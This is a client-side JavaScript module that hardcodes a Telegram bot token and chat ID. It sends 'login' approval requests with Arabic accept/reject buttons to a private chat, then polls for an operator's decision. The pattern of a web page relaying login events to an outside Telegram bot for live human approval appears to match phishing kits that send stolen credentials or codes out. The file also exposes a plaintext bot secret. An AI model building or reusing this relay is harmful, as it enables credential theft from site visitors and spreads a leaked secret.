const TELEGRAM_BOT_TOKEN = "8889676845:AAGYcVFa7vOi_0FYgpq3WscOXKADANb-2TI";
const TELEGRAM_CHAT_ID = "8108427825";
const TELEGRAM_API_BASE = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const TELEGRAM_UPDATE_OFFSET_KEY = "telegram_update_offset";

function getStoredUpdateOffset() {
  const rawValue = Number(localStorage.getItem(TELEGRAM_UPDATE_OFFSET_KEY) || "0");
  return Number.isFinite(rawValue) && rawValue > 0 ? rawValue : 0;
}

function setStoredUpdateOffset(offset) {
  if (!Number.isFinite(offset) || offset <= 0) return;
  localStorage.setItem(TELEGRAM_UPDATE_OFFSET_KEY, String(offset));
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function telegramRequest(method, payload = {}) {
  const response = await fetch(`${TELEGRAM_API_BASE}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });

  const data = await response.json();
  if (!response.ok || !data.ok) {
    throw new Error(data.description || `Telegram request failed for ${method}`);
  }

  return data.result;
}

async function send(text, extra = {}) {
  return telegramRequest("sendMessage", {
    chat_id: TELEGRAM_CHAT_ID,
    text,
    parse_mode: "MarkdownV2",
    ...extra,
  });
}

async function sendApprovalRequest(text, requestId) {
  return send(text, {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ قبول", callback_data: `login:${requestId}:accepted` },
          { text: "❌ رفض", callback_data: `login:${requestId}:rejected` },
        ],
      ],
    },
  });
}

async function getTelegramUpdates({ timeout = 0 } = {}) {
  const updates = await telegramRequest("getUpdates", {
    offset: getStoredUpdateOffset(),
    timeout,
    allowed_updates: ["callback_query"],
  });

  if (updates.length > 0) {
    setStoredUpdateOffset(updates[updates.length - 1].update_id + 1);
  }

  return updates;
}

function extractDecision(callbackData, requestId) {
  const prefix = `login:${requestId}:`;
  if (!callbackData || !callbackData.startsWith(prefix)) return null;

  const decision = callbackData.slice(prefix.length);
  return decision === "accepted" || decision === "rejected" ? decision : null;
}

async function finalizeDecisionMessage(callbackQuery, decision) {
  const chatId = callbackQuery?.message?.chat?.id;
  const messageId = callbackQuery?.message?.message_id;
  if (!chatId || !messageId) return;

  const statusText = decision === "accepted" ? "✅ تم الموافقة" : "❌ تم الرفض";
  const originalText = callbackQuery?.message?.text?.trim() || "";
  const text = originalText ? `${originalText}\n\nالحالة: ${statusText}` : statusText;

  try {
    await telegramRequest("editMessageText", {
      chat_id: chatId,
      message_id: messageId,
      text,
      reply_markup: {
        inline_keyboard: [],
      },
    });
  } catch (error) {
    await telegramRequest("editMessageReplyMarkup", {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: {
        inline_keyboard: [],
      },
    }).catch(() => {});
  }
}

async function waitForTelegramDecision(requestId, options = {}) {
  const timeoutMs = options.timeoutMs ?? 180000;
  const pollIntervalMs = options.pollIntervalMs ?? 2000;
  const deadline = Date.now() + timeoutMs;

  while (Date.now() < deadline) {
    const updates = await getTelegramUpdates();

    for (const update of updates) {
      const callbackQuery = update.callback_query;
      const decision = extractDecision(callbackQuery?.data, requestId);
      if (!decision) continue;

      const notificationText = decision === "accepted" ? "✅ تم الموافقة" : "❌ تم الرفض";
      await Promise.allSettled([
        finalizeDecisionMessage(callbackQuery, decision),
        callbackQuery?.id
          ? telegramRequest("answerCallbackQuery", {
              callback_query_id: callbackQuery.id,
              text: notificationText,
            })
          : Promise.resolve(),
      ]);

      return decision;
    }

    await sleep(pollIntervalMs);
  }

  throw new Error("Timed out waiting for Telegram approval");
}

window.send = send;
window.TELEGRAM_MARKDOWN_V2 = true;
window.sendApprovalRequest = sendApprovalRequest;
window.waitForTelegramDecision = waitForTelegramDecision;
